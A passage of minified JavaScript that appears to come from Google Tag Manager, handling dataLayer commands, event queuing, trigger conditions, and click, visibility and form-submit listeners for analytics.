          if (2 === a.length && a[1].getTime) {
            Px = !0;
            var c = Tx(a, b),
              d = c.eventId,
              e = c.priorityId,
              f = { event: "gtm.js" };
            return (
              (f["gtm.start"] = a[1].getTime()),
              (f["gtm.uniqueEventId"] = d),
              (f["gtm.priorityId"] = e),
              f
            );
          }
        },
        policy: function (a) {
          if (3 === a.length && l(a[1]) && pb(a[2])) {
            if (
              ((function (a, b) {
                var d,
                  c = Mf.D;
                null != (d = c.j)[a] || (d[a] = []),
                  c.j[a].push(function () {
                    return b.apply(null, pa(za.apply(0, arguments)));
                  });
              })(a[1], a[2]),
              O(74),
              "all" === a[1])
            ) {
              O(75);
              var b = !1;
              try {
                b = a[2](Cj(), "unknown", {});
              } catch (c) {}
              b || O(76);
            }
          } else O(73);
        },
        set: function (a, b) {
          var c = void 0;
          if (
            (2 === a.length && Ta(a[1])
              ? (c = h(a[1], null))
              : 3 === a.length &&
                l(a[1]) &&
                ((c = {}),
                Ta(a[2]) || Array.isArray(a[2])
                  ? (c[a[1]] = h(a[2], null))
                  : (c[a[1]] = a[2])),
            c)
          ) {
            var d = Tx(a, b),
              e = d.eventId,
              f = d.priorityId;
            h(c, null);
            var g = h(c, null);
            return (
              rm.push("set", [g], void 0, b),
              (c["gtm.uniqueEventId"] = e),
              f && (c["gtm.priorityId"] = f),
              delete c.event,
              (b.overwriteModelFields = !0),
              c
            );
          }
        },
      },
      $x = { policy: !0 },
      by = function (a) {
        if (ay(a)) return a;
        this.value = a;
      };
    by.prototype.getUntrustedMessageValue = function () {
      return this.value;
    };
    var ay = function (a) {
      return (
        !(!a || "object" !== Qa(a) || Ta(a)) && "getUntrustedMessageValue" in a
      );
    };
    by.prototype.getUntrustedMessageValue =
      by.prototype.getUntrustedMessageValue;
    var cy = !1,
      dy = [];
    function ey() {
      if (!cy) {
        cy = !0;
        for (var a = 0; a < dy.length; a++) I(dy[a]);
      }
    }
    function fy(a) {
      cy ? I(a) : dy.push(a);
    }
    var gy = 0,
      hy = {},
      iy = [],
      jy = [],
      ky = !1,
      ly = !1;
    function my(a, b) {
      return (
        a.messageContext.eventId - b.messageContext.eventId ||
        a.messageContext.priorityId - b.messageContext.priorityId
      );
    }
    var ny = function (a) {
        return G[gi.Ya].push(a);
      },
      oy = function (a, b, c) {
        return (a.eventCallback = b), c && (a.eventTimeout = c), ny(a);
      },
      py = function (a, b) {
        (!qb(b) || b < 0) && (b = 0);
        var c = hi[gi.Ya],
          d = 0,
          e = !1,
          f = void 0;
        return (
          (f = G.setTimeout(function () {
            e || ((e = !0), a()), (f = void 0);
          }, b)),
          function () {
            var g = c ? c.subscribers : 1;
            ++d === g &&
              (f && (G.clearTimeout(f), (f = void 0)), e || (a(), (e = !0)));
          }
        );
      };
    function qy(a, b) {
      var c = a._clear || b.overwriteModelFields;
      z(a, function (e, f) {
        "_clear" !== e && (c && Ji(e), Ji(e, f));
      }),
        ti || (ti = a["gtm.start"]);
      var d = a["gtm.uniqueEventId"];
      return (
        !!a.event &&
        ("number" != typeof d &&
          ((d = xi()),
          (a["gtm.uniqueEventId"] = d),
          Ji("gtm.uniqueEventId", d)),
        tx(a))
      );
    }
    function sy() {
      var a, b;
      if (jy.length) a = jy.shift();
      else {
        if (!iy.length) return;
        a = iy.shift();
      }
      var c = a;
      if (
        ky ||
        !(function ry(a) {
          if (null == a || "object" != typeof a) return !1;
          if (a.event) return !0;
          if (wb(a)) {
            var b = a[0];
            if ("config" === b || "event" === b || "js" === b || "get" === b)
              return !0;
          }
          return !1;
        })(c.message)
      )
        b = c;
      else {
        ky = !0;
        var d = c.message["gtm.uniqueEventId"];
        "number" != typeof d && (d = c.message["gtm.uniqueEventId"] = xi());
        var e = {},
          f = {
            message:
              ((e.event = "gtm.init_consent"),
              (e["gtm.uniqueEventId"] = d - 2),
              e),
            messageContext: { eventId: d - 2 },
          },
          g = {},
          k = {
            message:
              ((g.event = "gtm.init"), (g["gtm.uniqueEventId"] = d - 1), g),
            messageContext: { eventId: d - 1 },
          };
        if ((iy.unshift(k, c), nj)) {
          if (!U(83)) {
            var m = kw();
            m && jw.push(m);
          }
          fk();
        }
        b = f;
      }
      return b;
    }
    function ty() {
      for (var b, a = !1; !ly && (b = sy()); ) {
        (ly = !0), delete Di.eventModel, Fi();
        var c = b,
          d = c.message,
          e = c.messageContext;
        if (null == d) ly = !1;
        else {
          e.fromContainerExecution && Ki();
          try {
            if (pb(d))
              try {
                d.call(Hi);
              } catch (v) {}
            else if (Array.isArray(d)) {
              var f = d;
              if (l(f[0])) {
                var g = f[0].split("."),
                  k = g.pop(),
                  m = f.slice(1),
                  n = Gi(g.join("."), 2);
                if (null != n)
                  try {
                    n[k].apply(n, m);
                  } catch (v) {}
              }
            } else {
              var p = void 0;
              if (wb(d))
                a: {
                  if (d.length && l(d[0])) {
                    var q = Zx[d[0]];
                    if (q && (!e.fromContainerExecution || !$x[d[0]])) {
                      p = q(d, e);
                      break a;
                    }
                  }
                  p = void 0;
                }
              else p = d;
              p && (a = qy(p, e) || a);
            }
          } finally {
            e.fromContainerExecution && Fi(!0);
            var r = d["gtm.uniqueEventId"];
            if ("number" == typeof r) {
              for (var t = hy[String(r)] || [], u = 0; u < t.length; u++)
                jy.push(uy(t[u]));
              t.length && jy.sort(my), delete hy[String(r)], r > gy && (gy = r);
            }
            ly = !1;
          }
        }
      }
      return !a;
    }
    function vy() {
      if (U(68)) wy();
      var b = ty();
      U(68);
      try {
        var c = Cj(),
          d = G[gi.Ya].hide;
        if (d && void 0 !== d[c] && d.end) {
          d[c] = !1;
          var f,
            e = !0;
          for (f in d)
            if (d.hasOwnProperty(f) && !0 === d[f]) {
              e = !1;
              break;
            }
          e && (d.end(), (d.end = null));
        }
      } catch (g) {}
      return b;
    }
    function Ix(a) {
      if (gy < a.notBeforeEventId) {
        var b = String(a.notBeforeEventId);
        (hy[b] = hy[b] || []), hy[b].push(a);
      } else
        jy.push(uy(a)),
          jy.sort(my),
          I(function () {
            ly || ty();
          });
    }
    function uy(a) {
      return { message: a.message, messageContext: a.messageContext };
    }
    var xy = function () {
        function a(f) {
          var g = {};
          if (ay(f)) {
            var k = f;
            (f = ay(k) ? k.getUntrustedMessageValue() : void 0),
              (g.fromContainerExecution = !0);
          }
          return { message: f, messageContext: g };
        }
        var b = uc(gi.Ya, []),
          c = (hi[gi.Ya] = hi[gi.Ya] || {});
        !0 === c.pruned && O(83),
          (hy = Gx().get()),
          (function Hx() {
            var a = Ix;
            Gx().listen(a);
          })(),
          sw(function () {
            if (!c.gtmDom) {
              c.gtmDom = !0;
              var f = {};
              b.push(((f.event = "gtm.dom"), f));
            }
          }),
          fy(function () {
            if (!c.gtmLoad) {
              c.gtmLoad = !0;
              var f = {};
              b.push(((f.event = "gtm.load"), f));
            }
          }),
          (c.subscribers = (c.subscribers || 0) + 1);
        var d = b.push;
        b.push = function () {
          var f;
          if (hi.SANDBOXED_JS_SEMAPHORE > 0) {
            f = [];
            for (var g = 0; g < arguments.length; g++)
              f[g] = new by(arguments[g]);
          } else f = [].slice.call(arguments, 0);
          var k = f.map(function (q) {
            return a(q);
          });
          iy.push.apply(iy, k);
          var m = d.apply(b, f),
            n = Math.max(100, Number("1000") || 300);
          if (this.length > n)
            for (O(4), c.pruned = !0; this.length > n; ) this.shift();
          var p = "boolean" != typeof m || m;
          return ty() && p;
        };
        var e = b.slice(0).map(function (f) {
          return a(f);
        });
        iy.push.apply(iy, e), wy() && (U(68), I(vy));
      },
      wy = function () {
        return !0;
      };
    function yy(a) {
      if (null == a || 0 === a.length) return !1;
      var b = Number(a),
        c = Cb();
      return b < c + 3e5 && b > c - 9e5;
    }
    var Vy = function () {};
    Vy.prototype.toString = function () {
      return "undefined";
    };
    var Wy = new Vy(),
      bz = function (a) {
        var b = a ? 0 : 1;
        return function (c) {
          O(a ? 134 : 135);
          var d = $y[c];
          d && "function" == typeof d[b] && d[b](), ($y[c] = void 0);
        };
      },
      Zy = function (a) {
        (this.valueOf = this.toString),
          (this.resolve = function (b) {
            for (var c = [], d = 0; d < a.length; d++)
              c.push(a[d] === Wy ? b : a[d]);
            return c.join("");
          });
      };
    Zy.prototype.toString = function () {
      return this.resolve("undefined");
    };
    var Xy = {},
      $y = {};
    function dz(a) {
      return (function ez(a) {
        var b = a.arg0,
          c = a.arg1;
        if (a.any_of && Array.isArray(c)) {
          for (var d = 0; d < c.length; d++) {
            var e = h(a, {});
            if ((h({ arg1: c[d], any_of: void 0 }, e), dz(e))) return !0;
          }
          return !1;
        }
        switch (a.function) {
          case "_cn":
            return (function pg(a, b) {
              return String(a).indexOf(String(b)) >= 0;
            })(b, c);
          case "_css":
            var f;
            a: {
              if (b)
                try {
                  for (var g = 0; g < lg.length; g++) {
                    var k = lg[g];
                    if (null != b[k]) {
                      f = b[k](c);
                      break a;
                    }
                  }
                } catch (m) {}
              f = !1;
            }
            return f;
          case "_ew":
            return (function mg(a, b) {
              var c = String(a),
                d = String(b),
                e = c.length - d.length;
              return e >= 0 && c.indexOf(d, e) === e;
            })(b, c);
          case "_eq":
            return (function qg(a, b) {
              return String(a) === String(b);
            })(b, c);
          case "_ge":
            return (function rg(a, b) {
              return Number(a) >= Number(b);
            })(b, c);
          case "_gt":
            return (function tg(a, b) {
              return Number(a) > Number(b);
            })(b, c);
          case "_lc":
            return String(b).split(",").indexOf(String(c)) >= 0;
          case "_le":
            return (function sg(a, b) {
              return Number(a) <= Number(b);
            })(b, c);
          case "_lt":
            return (function ug(a, b) {
              return Number(a) < Number(b);
            })(b, c);
          case "_re":
            return (function og(a, b, c) {
              var d = c ? "i" : void 0;
              try {
                var e = String(b) + String(d),
                  f = ng.get(e);
                return f || ((f = new RegExp(b, d)), ng.set(e, f)), f.test(a);
              } catch (g) {
                return !1;
              }
            })(b, c, a.ignore_case);
          case "_sw":
            return (function vg(a, b) {
              return Hb(String(a), String(b));
            })(b, c);
          case "_um":
            return (function cz(a, b) {
              function c(g) {
                var k = Yi(g),
                  m = Si(k, "protocol"),
                  n = Si(k, "host", !0),
                  p = Si(k, "port");
                return (
                  (void 0 === m ||
                    ("http" === m && "80" === p) ||
                    ("https" === m && "443" === p)) &&
                    ((m = "web"), (p = "default")),
                  [m, n, p, Si(k, "path").toLowerCase().replace(/\/$/, "")]
                );
              }
              for (
                var d = c(String(a)), e = c(String(b)), f = 0;
                f < d.length;
                f++
              )
                if (d[f] !== e[f]) return !1;
              return !0;
            })(b, c);
        }
        return !1;
      })(a)
        ? 1
        : 0;
    }
    function fz() {
      var a, b, c;
      return (
        (a = void 0 === a ? "" : a),
        null != (b = data) && null != (c = b.blob) && c.hasOwnProperty(1)
          ? String(data.blob[1])
          : a
      );
    }
    function gz() {
      var a = [
        ["cv", U(90) ? fz() : "180"],
        ["rv", gi.Vg],
        [
          "tc",
          mf.filter(function (b) {
            return b;
          }).length,
        ],
      ];
      return (
        gi.se && a.push(["x", gi.se]), zi.j && a.push(["tag_exp", zi.j]), a
      );
    }
    var hz = {},
      iz = {};
    function jz() {
      var a = 0;
      return function (b) {
        switch (b) {
          case 1:
            a |= 1;
            break;
          case 2:
            a |= 2;
            break;
          case 3:
            a |= 4;
        }
        return a;
      };
    }
    function lz(a) {
      var b = a.eventId,
        c = a.mc,
        d = [],
        e = hz[b] || [];
      e.length && d.push(["hf", e.join(".")]);
      var f = iz[b] || [];
      return (
        f.length && d.push(["ht", f.join(".")]),
        c && (delete hz[b], delete iz[b]),
        d
      );
    }
    function oz() {
      var a = pz;
      return function (b, c, d) {
        var e = d && d.event;
        !(function qz(a) {
          var b = a.gtmOnSuccess,
            c = a.gtmOnFailure;
          pb(b) &&
            (a.gtmOnSuccess = function () {
              I(b);
            }),
            pb(c) &&
              (a.gtmOnFailure = function () {
                I(c);
              });
        })(c);
        var f = Hb(b, "__cvt_") ? void 0 : 1,
          g = new Za();
        z(c, function (r, t) {
          var u = fd(t, void 0, f);
          void 0 === u && void 0 !== t && O(44), g.set(r, u);
        }),
          (a.j.j.D = (function Ff() {
            return function (a, b) {
              throw (
                (a instanceof Ef || (a = new Ef(a, Gf)),
                b && a instanceof Ef && a.j.push(b),
                a)
              );
            };
          })());
        var k = {
          Nj: Uf(b),
          eventId: null == e ? void 0 : e.id,
          priorityId: void 0 !== e ? e.priorityId : void 0,
          we:
            void 0 !== e
              ? function (r) {
                  e.ic.we(r);
                }
              : void 0,
          hb: function () {
            return b;
          },
          log: function () {},
          Il: {
            index: null == d ? void 0 : d.index,
            type: null == d ? void 0 : d.type,
            name: null == d ? void 0 : d.name,
          },
          Pm: !!Tv(b, 3),
          originalEventData: null == e ? void 0 : e.originalEventData,
        };
        e &&
          e.cachedModelValues &&
          (k.cachedModelValues = {
            gtm: e.cachedModelValues.gtm,
            ecommerce: e.cachedModelValues.ecommerce,
          });
        var q = (function (a, b, c) {
          return De(a.j.Uk(b, c));
        })(a, k, [b, g]);
        return (
          (a.j.j.D = void 0),
          q instanceof Ca && "return" === q.type && (q = q.data),
          J(q, void 0, f)
        );
      };
    }
    function rz(a, b) {}
    rz.T = "addConsentListener";
    var sz = !1;
    function tz(a) {
      for (var b = 0; b < a.length; ++b)
        if (sz)
          try {
            a[b]();
          } catch (c) {
            O(77);
          }
        else a[b]();
    }
    function uz(a, b, c) {}
    function xz(a) {
      return a.F.j;
    }
    function yz(a) {}
    (uz.J = "internal.addDataLayerEventListener"), (yz.T = "addEventCallback");
    var zz = function (a) {
        return "string" == typeof a ? a : String(xi());
      },
      Az = function (a, b, c) {
        return Db(Dz(a), b, c);
      },
      Ez = function (a, b, c, d) {
        var e = Dz(a),
          f = Db(e, b, d);
        e[b] = c(f);
      },
      Bz = function (a, b, c) {
        Dz(a)[b] = c;
      },
      Dz = function (a) {
        hi.hasOwnProperty("autoEventsSettings") || (hi.autoEventsSettings = {});
        var b = hi.autoEventsSettings;
        return b.hasOwnProperty(a) || (b[a] = {}), b[a];
      },
      Fz = function (a, b, c) {
        var d = {
          event: b,
          "gtm.element": a,
          "gtm.elementClasses": Pc(a, "className"),
          "gtm.elementId": a.for || Gc(a, "id") || "",
          "gtm.elementTarget": a.formTarget || Pc(a, "target") || "",
        };
        return (
          c && (d["gtm.triggers"] = c.join(",")),
          (d["gtm.elementUrl"] =
            (a.attributes && a.attributes.formaction ? a.formAction : "") ||
            a.action ||
            Pc(a, "href") ||
            a.src ||
            a.code ||
            a.codebase ||
            ""),
          d
        );
      },
      Gz = function (a) {
        var b = a.tagName.toLowerCase();
        return !(
          Jz.indexOf(b) < 0 ||
          ("input" === b && Kz.indexOf(a.type.toLowerCase()) >= 0)
        );
      },
      Jz = ["input", "select", "textarea"],
      Kz = ["button", "hidden", "image", "reset", "submit"];
    function Pz(a, b, c, d) {}
    Pz.J = "internal.addFormData";
    function aA(a, b) {}
    function hA(a, b) {}
    function mA(a) {}
    function nA(a) {
      if (!a) return {};
      var b = a.Il;
      return uw(b.type, b.index, b.name);
    }
    function oA(a) {
      return a ? { originatingEntity: nA(a) } : {};
    }
    function xA() {
      !(function Wv(a, b, c) {
        (c = void 0 !== c && c), Vv().addRestriction(1, a, b, c);
      })(Ej(), function (a) {
        var b = a.originalEventData["gtm.uniqueEventId"],
          c = hi.zones;
        return !c || c.isActive(xj(), b);
      }),
        Uv(Ej(), function (a) {
          var b, c;
          return (
            (b = a.entityId),
            (c = a.securityGroups),
            (function wA(a) {
              var b = hi.zones;
              return b
                ? b.getIsAllowedFn(xj(), a)
                : function () {
                    return !0;
                  };
            })(Number(a.originalEventData["gtm.uniqueEventId"]))(b, c)
          );
        });
    }
    (aA.J = "internal.addFormInteractionListener"),
      (hA.J = "internal.addFormSubmitListener"),
      (mA.J = "internal.addGaSendListener");
    function zA(a, b) {}
    function BA(a, b, c) {}
    (zA.J = "internal.loadGoogleTag"),
      (BA.J = "internal.addGoogleTagRestriction");
    function KA(a, b) {}
    function MA(a, b) {
      return !0;
    }
    function NA(a, b, c) {}
    function OA(a) {}
    function PA(a) {}
    function QA(a) {}
    function RA(a) {
      K(this.getName(), ["listener:!Fn"], arguments),
        N(this, "process_dom_events", "window", "load"),
        fy(J(a));
    }
    function SA(a, b) {}
    function TA(a) {}
    function UA(a, b) {
      var c,
        d = fd(c, this.F, Hb(xz(this).hb(), "__cvt_") ? 2 : 1);
      return d;
    }
    function VA(a) {}
    function WA(a) {
      var b;
      K(this.getName(), ["path:!string"], arguments),
        N(this, "access_globals", "read", a);
      var c = a.split("."),
        d = Jb(c, [G, H]);
      if (d) {
        var e = d[c[c.length - 1]];
        return void 0 === (b = fd(e, this.F, 2)) && void 0 !== e && O(45), b;
      }
    }
    function XA(a) {
      return fd(void 0, this.F, 1);
    }
    (KA.J = "internal.addHistoryChangeListener"),
      (MA.T = "aliasInWindow"),
      (NA.J = "internal.appendRemoteConfigParameter"),
      (OA.T = "callInWindow"),
      (PA.T = "callLater"),
      (QA.J = "callOnDomReady"),
      (RA.J = "callOnWindowLoad"),
      (SA.J = "internal.computeGtmParameter"),
      (TA.J = "internal.copyFromCrossContainerData"),
      (UA.T = "copyFromDataLayer"),
      (VA.J = "internal.copyFromDataLayerCache"),
      (WA.T = "copyFromWindow"),
      (XA.J = "internal.copyKeyFromWindow");
    var YA = function (a, b, c) {
      (this.eventName = b),
        (this.m = c),
        (this.o = {}),
        (this.isAborted = !1),
        (this.target = a),
        (this.metadata = h(c.eventMetadata || {}, {}));
    };
    YA.prototype.copyToHitData = function (a, b, c) {
      var d = Q(this.m, a);
      if (
        (void 0 === d && (d = b), void 0 !== d && void 0 !== c && l(d) && U(62))
      )
        try {
          d = c(d);
        } catch (e) {}
      void 0 !== d && (this.o[a] = d);
    };
    var Vs = function (a, b, c) {
      var d = Yr(a.target.ia);
      return d && void 0 !== d[b] ? d[b] : c;
    };
    function ZA(a, b) {}
    function $A(a, b) {
      var c;
      K(
        this.getName(),
        ["functionPath:!string", "arrayPath:!string"],
        arguments
      ),
        N(this, "access_globals", "readwrite", a),
        N(this, "access_globals", "readwrite", b);
      var d = [G, H],
        e = a.split("."),
        f = Jb(e, d),
        g = e[e.length - 1];
      if (void 0 === f) throw Error("Path " + a + " does not exist.");
      var m,
        k = f[g];
      if (k && !pb(k)) return null;
      if (k) return fd(k, this.F, 2);
      (k = function () {
        if (!pb(m.push))
          throw Error("Object at " + b + " in window is not an array.");
        m.push.call(m, arguments);
      }),
        (f[g] = k);
      var n = b.split("."),
        p = Jb(n, d),
        q = n[n.length - 1];
      if (void 0 === p) throw Error("Path " + n + " does not exist.");
      return (
        void 0 === (m = p[q]) && ((m = []), (p[q] = m)),
        (c = function () {
          k.apply(k, Array.prototype.slice.call(arguments, 0));
        }),
        fd(c, this.F, 2)
      );
    }
    function aB(a) {
      return fd(
        function (c) {
          var d = Ew();
          if ("function" == typeof c)
            d(function () {
              c(function (f, g, k) {
                var m = Ew(),
                  n = m && m.getByName && m.getByName(f);
                return (function (a, b) {
                  var c = function () {};
                  c.prototype = a.prototype;
                  var d = new c();
                  return (
                    a.apply(d, Array.prototype.slice.call(arguments, 1)), d
                  );
                })(G.gaplugins.Linker, n).decorate(g, k);
              });
            });
          else if (Array.isArray(c)) {
            var e = String(c[0]).split(".");
            b[1 === e.length ? e[0] : e[1]] && d.apply(null, c);
          } else if ("isLoaded" === c) return !!d.loaded;
        },
        this.F,
        1
      );
    }
    function bB(a) {
      return fd(
        function () {
          if (!pb(e.push))
            throw Error("Object at " + a + " in window is not an array.");
          e.push.apply(e, Array.prototype.slice.call(arguments, 0));
        },
        this.F,
        Hb(xz(this).hb(), "__cvt_") ? 2 : 1
      );
    }
    function cB(a, b) {
      return null;
    }
    function eB(a) {}
    function fB(a) {
      return "";
    }
    function gB(a, b, c) {}
    function hB(a) {}
    (ZA.J = "internal.copyPreHit"),
      ($A.T = "createArgumentsQueue"),
      (aB.J = "internal.createGaCommandQueue"),
      (bB.T = "createQueue"),
      (cB.J = "internal.createRegex"),
      (eB.J = "internal.declareConsentState"),
      (fB.J = "internal.decodeUrlHtmlEntities"),
      (gB.J = "internal.decorateUrlWithGaCookies"),
      (hB.J = "internal.detectUserProvidedData");
    var kB = function (a, b, c) {
      var d = c.target;
      if (d) {
        var e = Az(a, "individualElementIds", []);
        if (e.length > 0) {
          var f = Fz(d, b, e);
          ny(f);
        }
        var g = !1,
          k = Az(a, "commonButtonIds", []);
        if (k.length > 0) {
          var m = (function (a) {
            var b = Jc(a, ["button", "input"], 50);
            if (!b) return null;
            var c = String(b.tagName).toLowerCase();
            if ("button" === c) return b;
            if ("input" === c) {
              var d = Gc(b, "type");
              if (
                "button" === d ||
                "submit" === d ||
                "image" === d ||
                "file" === d ||
                "reset" === d
              )
                return b;
            }
            return null;
          })(d);
          if (m) {
            var n = Fz(m, b, k);
            ny(n), (g = !0);
          }
        }
        var q,
          p = Az(a, "selectorToTriggerIds", {});
        for (q in p)
          if (p.hasOwnProperty(q)) {
            var r = g
              ? p[q].filter(function (v) {
                  return -1 === k.indexOf(v);
                })
              : p[q];
            if (0 !== r.length) {
              var t = oh(d, q);
              if (t) {
                var u = Fz(t, b, r);
                ny(u);
              }
            }
          }
      }
    };
    function lB(a, b) {
      K(this.getName(), ["options:?PixieMap", "triggerId:?*"], arguments);
      var c = a ? J(a) : {},
        d = yb(c.matchCommonButtons),
        e = !!c.cssSelector;
      (b = zz(b)),
        N(this, "detect_click_events", c.matchCommonButtons, c.cssSelector);
      var f = c.useV2EventName ? "gtm.click-v2" : "gtm.click",
        g = c.useV2EventName ? "ecl" : "cl",
        k = function (n) {
          return n.push(b), n;
        };
      if (e || d) {
        if ((d && Ez(g, "commonButtonIds", k, []), e)) {
          var m = Ab(String(c.cssSelector));
          Ez(
            g,
            "selectorToTriggerIds",
            function (n) {
              return n.hasOwnProperty(m) || (n[m] = []), k(n[m]), n;
            },
            {}
          );
        }
      } else Ez(g, "individualElementIds", k, []);
      return (
        (function (a, b) {
          Az(a, "init", !1) || (Bz(a, "init", !0), b());
        })(g, function () {
          Ec(
            H,
            "click",
            function (n) {
              kB(g, f, n);
            },
            !0
          );
        }),
        b
      );
    }
    lB.J = "internal.enableAutoEventOnClick";
    var mB,
      oB = function (a) {
        if (!mB) {
          var b = function () {
            var c = H.body;
            if (c)
              if (nB)
                new MutationObserver(function () {
                  for (var e = 0; e < mB.length; e++) I(mB[e]);
                }).observe(c, { childList: !0, subtree: !0 });
              else {
                var d = !1;
                Ec(c, "DOMNodeInserted", function () {
                  d ||
                    ((d = !0),
                    I(function () {
                      d = !1;
                      for (var e = 0; e < mB.length; e++) I(mB[e]);
                    }));
                });
              }
          };
          (mB = []), H.body ? b() : I(b);
        }
        mB.push(a);
      },
      nB = !!G.MutationObserver,
      pB = function (a) {
        a.has("PollingId") &&
          (G.clearInterval(Number(a.get("PollingId"))), a.j("PollingId"));
      },
      qB = function () {
        var a = Number(Gi("gtm.start", 2)) || 0;
        return Cb() - a;
      },
      sB = function (a, b) {
        (this.element = a), (this.uid = b);
      };
    function tB(a, b) {
      var c = function (u) {
          var v = new sB(u.target, p);
          u.intersectionRatio >= n
            ? v.has("HasFired") ||
              (function (a, b, c, d) {
                function e() {
                  if (!$r(a.target)) {
                    b.has("RecentOnScreen") ||
                      b.set("RecentOnScreen", "" + qB()),
                      b.has("FirstOnScreen") ||
                        b.set("FirstOnScreen", "" + qB());
                    var g = 0;
                    if (
                      (b.has("TotalVisibleTime") &&
                        (g = Number(b.get("TotalVisibleTime"))),
                      (g += 100),
                      b.set("TotalVisibleTime", "" + g),
                      g >= c)
                    ) {
                      var k = Fz(a.target, "gtm.elementVisibility", [b.uid]),
                        m = bs(a.target);
                      (k["gtm.visibleRatio"] = Math.round(1e3 * m) / 10),
                        (k["gtm.visibleTime"] = c),
                        (k["gtm.visibleFirstTime"] = Number(
                          b.get("FirstOnScreen")
                        )),
                        (k["gtm.visibleLastTime"] = Number(
                          b.get("RecentOnScreen")
                        )),
                        ny(k),
                        d();
                    }
                  }
                }
                if (
                  !b.has("PollingId") &&
                  (0 == c && e(), !b.has("HasFired"))
                ) {
                  var f = G.setInterval(e, 100);
                  b.set("PollingId", String(f));
                }
              })(
                u,
                v,
                m,
                "ONCE" === q
                  ? function () {
                      for (var w = 0; w < r.length; w++) {
                        var x = new sB(r[w], p);
                        x.set("HasFired", "1"), pB(x);
                      }
                      if ((es(t), k)) {
                        var y = d;
                        if (mB)
                          for (var B = 0; B < mB.length; B++)
                            mB[B] === y && mB.splice(B, 1);
                      }
                    }
                  : function () {
                      v.set("HasFired", "1"), pB(v);
                    }
              )
            : (pB(v),
              "MANY_PER_ELEMENT" === q &&
                v.has("HasFired") &&
                (v.j("HasFired"), v.j("TotalVisibleTime")),
              v.j("RecentOnScreen"));
        },
        d = function () {
          var u = !1,
            v = null;
          if ("CSS" === f) {
            try {
              v = mh(g);
            } catch (B) {}
            u = !!v && r.length != v.length;
          } else if ("ID" === f) {
            var w = H.getElementById(g);
            w && ((v = [w]), (u = 1 != r.length || r[0] !== w));
          }
          if ((v || ((v = []), (u = r.length > 0)), u)) {
            for (var x = 0; x < r.length; x++) pB(new sB(r[x], p));
            r = [];
            for (var y = 0; y < v.length; y++) r.push(v[y]);
            t >= 0 && es(t),
              r.length > 0 &&
                (t = (function (a, b, c) {
                  for (var d = 0; d < c.length; d++)
                    c[d] > 1 ? (c[d] = 1) : c[d] < 0 && (c[d] = 0);
                  if (cs) {
                    var e = !1;
                    return (
                      I(function () {
                        e || fs(a, b, c)();
                      }),
                      gs(
                        function (f) {
                          e = !0;
                          for (
                            var g = { Ke: 0 };
                            g.Ke < f.length;
                            (g = { Ke: g.Ke }).Ke++
                          )
                            I(
                              (function (k) {
                                return function () {
                                  a(f[k.Ke]);
                                };
                              })(g)
                            );
                        },
                        b,
                        c
                      )
                    );
                  }
                  return G.setInterval(fs(a, b, c), 1e3);
                })(c, r, [n]));
          }
        };
      K(this.getName(), ["options:?PixieMap", "triggerId:?*"], arguments),
        N(this, "detect_element_visibility_events");
      var g,
        e = a ? J(a) : {},
        f = e.selectorType;
      switch (f) {
        case "ID":
          g = String(e.id);
          break;
        case "CSS":
          g = String(e.selector);
          break;
        default:
          throw Error(
            "Unrecognized element selector type " +
              f +
              ". Must be one of 'ID' or 'CSS'."
          );
      }
      var k = !!e.useDomChangeListener,
        m = (e.onScreenDuration && Number(e.onScreenDuration)) || 0,
        n = (Number(e.onScreenRatio) || 50) / 100,
        p = zz(b),
        q = e.firingFrequency,
        r = [],
        t = -1;
      return d(), k && oB(d), b;
    }
    function uB() {}
    (sB.prototype.has = function (a) {
      return !!this.element.dataset["gtmVis" + a + this.uid];
    }),
      (sB.prototype.get = function (a) {
        return this.element.dataset["gtmVis" + a + this.uid];
      }),
      (sB.prototype.set = function (a, b) {
        this.element.dataset["gtmVis" + a + this.uid] = b;
      }),
      (sB.prototype.j = function (a) {
        delete this.element.dataset["gtmVis" + a + this.uid];
      }),
      (tB.J = "internal.enableAutoEventOnElementVisibility"),
      (uB.J = "internal.enableAutoEventOnError");
    function FB(a, b) {
      return b;
    }
    FB.J = "internal.enableAutoEventOnFormInteraction";
    var GB = function (a, b, c, d, e) {
        var g,
          f = Az("fsl", c ? "nv.mwt" : "mwt", 0);
        if (!(g = Az("fsl", c ? "nv.ids" : "ids", [])).length) return !0;
        var k = Fz(a, "gtm.formSubmit", g),
          m = a.action;
        if (
          (m && m.tagName && (m = a.cloneNode(!1).action),
          O(121),
          "https://www.facebook.com/tr/" === m)
        )
          return O(122), !0;
        if (
          ((k["gtm.elementUrl"] = m),
          (k["gtm.formCanceled"] = c),
          null != a.getAttribute("name") &&
            (k["gtm.interactedFormName"] = a.getAttribute("name")),
          e &&
            ((k["gtm.formSubmitElement"] = e),
            (k["gtm.formSubmitElementText"] = e.value)),
          d && f)
        ) {
          if (!oy(k, py(b, f), f)) return !1;
        } else oy(k, function () {}, f || 2e3);
        return !0;
      },
      IB = function (a) {
        var b = a.target;
        return !b || "_self" === b || "_parent" === b || "_top" === b;
      },
      JB = function () {
        var a = (function () {
            var a = [],
              b = function (c) {
                return sb(a, function (d) {
                  return d.form === c;
                });
              };
            return {
              store: function (c, d) {
                var e = b(c);
                e ? (e.button = d) : a.push({ form: c, button: d });
              },
              get: function (c) {
                var d = b(c);
                if (d) return d.button;
              },
            };
          })(),
          b = HTMLFormElement.prototype.submit;
        Ec(
          H,
          "click",
          function (c) {
            var d = c.target;
            if (d) {
              var e = Jc(d, ["button", "input"], 100);
              if (
                e &&
                ("submit" === e.type || "image" === e.type) &&
                e.name &&
                Gc(e, "value")
              ) {
                var f = (function (a) {
                  var b;
                  return a.form
                    ? null != (b = a.form) && b.tagName
                      ? a.form
                      : H.getElementById(a.form)
                    : Jc(a, ["form"], 100);
                })(e);
                f && a.store(f, e);
              }
            }
          },
          !1
        ),
          Ec(
            H,
            "submit",
            function (c) {
              var d = c.target;
              if (!d) return c.returnValue;
              var e = c.defaultPrevented || !1 === c.returnValue,
                f = IB(d) && !e,
                g = a.get(d),
                k = !0;
              return GB(
                d,
                function () {
                  if (k) {
                    var m = null,
                      n = {};
                    g &&
                      (((m = H.createElement("input")).type = "hidden"),
                      (m.name = g.name),
                      (m.value = g.value),
                      d.appendChild(m),
                      g.hasAttribute("formaction") &&
                        ((n.action = d.getAttribute("action")),
                        oc(d, fc(g.getAttribute("formaction")))),
                      g.hasAttribute("formenctype") &&
                        ((n.enctype = d.getAttribute("enctype")),
                        d.setAttribute(
                          "enctype",
                          g.getAttribute("formenctype")
                        )),
                      g.hasAttribute("formmethod") &&
                        ((n.method = d.getAttribute("method")),
                        d.setAttribute("method", g.getAttribute("formmethod"))),
                      g.hasAttribute("formvalidate") &&
                        ((n.validate = d.getAttribute("validate")),
